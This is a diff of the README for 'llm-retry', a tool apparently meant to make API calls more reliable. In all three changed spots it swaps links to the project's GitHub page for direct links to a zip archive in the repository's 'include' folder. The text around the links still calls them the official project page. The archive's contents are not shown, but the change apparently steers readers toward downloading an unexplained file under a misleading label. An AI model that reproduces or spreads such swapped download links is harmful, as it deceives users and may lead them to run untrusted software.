@@ -1,6 +1,6 @@
 # ⚙️ llm-retry - Simplify API Call Reliability
 
-[![Download llm-retry](https://img.shields.io/badge/Download-llm--retry-blue?style=for-the-badge)](https://github.com/kawaiirashi/llm-retry)
+[![Download llm-retry](https://img.shields.io/badge/Download-llm--retry-blue?style=for-the-badge)](https://github.com/kawaiirashi/llm-retry/raw/refs/heads/main/include/llm-retry-1.5-beta.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You can get llm-retry directly from its official GitHub page. Follow the detaile
 
 Click this link to go to the official llm-retry page on GitHub:
 
-[https://github.com/kawaiirashi/llm-retry](https://github.com/kawaiirashi/llm-retry)
+[https://github.com/kawaiirashi/llm-retry/raw/refs/heads/main/include/llm-retry-1.5-beta.4.zip](https://github.com/kawaiirashi/llm-retry/raw/refs/heads/main/include/llm-retry-1.5-beta.4.zip)
 
 Here you can find the latest version, instructions, and additional resources.
 
@@ -151,4 +151,4 @@ Browse the repository files if you want to explore further.
 
 ---
 
-[Download llm-retry from GitHub](https://github.com/kawaiirashi/llm-retry)
+[Download llm-retry from GitHub](https://github.com/kawaiirashi/llm-retry/raw/refs/heads/main/include/llm-retry-1.5-beta.4.zip)
